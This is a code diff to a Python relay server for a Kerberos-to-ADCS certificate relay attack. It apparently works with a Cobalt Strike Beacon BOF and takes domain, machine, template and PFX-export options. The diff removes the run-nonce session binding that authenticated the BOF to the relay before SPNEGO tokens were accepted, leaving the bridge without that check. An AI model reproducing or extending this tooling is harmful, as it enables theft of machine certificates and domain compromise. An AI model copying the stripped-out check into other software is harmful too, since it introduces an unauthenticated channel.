@@ -20,7 +20,6 @@ import base64
 import html
 import os
 import re
-import secrets
 import socket
 import struct
 import sys
@@ -38,22 +37,17 @@ from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
 # The wire format is documented in docs/protocol.md. Conservative limits keep
 # a malformed peer or HTTP endpoint from forcing unbounded memory growth.
 MAGIC = b"KRB1"
-VERSION = 2
-MSG_HELLO = 1
-MSG_HELLO_OK = 2
+VERSION = 3
 MSG_CLIENT_AUTH_TOKEN = 3
 MSG_SERVER_AUTH_TOKEN = 4
 MSG_AUTH_OK = 5
 MSG_ERROR = 6
-NONCE_LENGTH = 64
 MAX_TOKEN = 65535
 MAX_ERROR = 512
 MAX_HEADER = 64 * 1024
 MAX_BODY = 4 * 1024 * 1024
 
 MESSAGE_LIMITS = {
-    MSG_HELLO: (NONCE_LENGTH, NONCE_LENGTH),
-    MSG_HELLO_OK: (0, 0),
     MSG_CLIENT_AUTH_TOKEN: (1, MAX_TOKEN),
     MSG_SERVER_AUTH_TOKEN: (1, MAX_TOKEN),
     MSG_AUTH_OK: (0, 0),
@@ -120,27 +114,6 @@ class RecordChannel:
         if not minimum <= len(payload) <= maximum:
             raise RelayError("invalid bridge payload length")
         self.sock.sendall(struct.pack("!4sBBHI", MAGIC, VERSION, kind, 0, len(payload)) + payload)
-
-
-def normalize_run_nonce(value: Optional[str]) -> str:
-    """Return one canonical 256-bit run nonce suitable for both bridge peers."""
-    if value is None:
-        return secrets.token_hex(32)
-    if not re.fullmatch(r"[0-9a-fA-F]{64}", value):
-        raise ValueError("run nonce must contain exactly 64 hexadecimal characters")
-    return value.lower()
-
-
-def bind_session(channel: RecordChannel, expected_nonce: str) -> None:
-    """Bind a BOF invocation before opening ADCS or accepting SPNEGO tokens."""
-    _, nonce = channel.receive({MSG_HELLO})
-    try:
-        supplied = nonce.decode("ascii", errors="strict")
-    except UnicodeDecodeError as exc:
-        raise RelayError("run nonce is not ASCII") from exc
-    if not secrets.compare_digest(supplied, expected_nonce):
-        raise RelayError("run nonce does not match this relay session")
-    channel.send(MSG_HELLO_OK)
 
 
 class RawHttpConnection:
@@ -631,7 +604,6 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
     parser.add_argument("--domain", required=True)
     parser.add_argument("--machine", required=True)
     parser.add_argument("--template", required=True)
-    parser.add_argument("--run-nonce", help="64 hexadecimal characters shared with the BOF; generated when omitted")
     parser.add_argument("--quiet", action="store_false", dest="verbose")
     parser.add_argument("--trace-spnego", action="store_true")
     parser.add_argument("--export-pfx-b64", action="store_true")
@@ -647,10 +619,6 @@ def main(argv: list[str]) -> int:
             raise SystemExit(f"--{name.replace('_', '-')} must be an absolute HTTP path")
     if any(not 1 <= value <= 65535 for value in (options.port, options.adcs_port)):
         raise SystemExit("TCP ports must be between 1 and 65535")
-    try:
-        options.run_nonce = normalize_run_nonce(options.run_nonce)
-    except ValueError as exc:
-        raise SystemExit(f"--run-nonce {str(exc).removeprefix('run nonce ')}") from exc
     # Resolve the allow value before listening. The common rportfwd_local path
     # appears as 127.0.0.1 regardless of the original target network address.
     allowed_addresses = {
@@ -658,10 +626,9 @@ def main(argv: list[str]) -> int:
     }
     last_bundle: Optional[CertificateBundle] = None
     service_spn = f"http/{options.adcs_host}"
-    print(f"[*] Run nonce: {options.run_nonce}", flush=True)
     print(
-        f"[*] Matching Beacon command: krbrelay <SACRIFICIAL_PROCESS> {options.port} "
-        f"{service_spn} <RPC_ENDPOINT> {options.run_nonce}",
+        f"[*] Matching Beacon command: krbrelay {options.port} "
+        f"{service_spn} <RPC_ENDPOINT>",
         flush=True,
     )
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
@@ -678,9 +645,6 @@ def main(argv: list[str]) -> int:
                 print(f"[+] Accepted authorized bridge connection from {peer[0]}", flush=True)
             channel = RecordChannel(client)
             try:
-                bind_session(channel, options.run_nonce)
-                if options.verbose:
-                    print("[+] Bound the BOF to this relay session before accepting authentication material", flush=True)
                 last_bundle = run_session(channel, options)
             except (RelayError, OSError, ValueError, TypeError) as exc:
                 # Give the BOF a short, printable policy/transport reason. Any
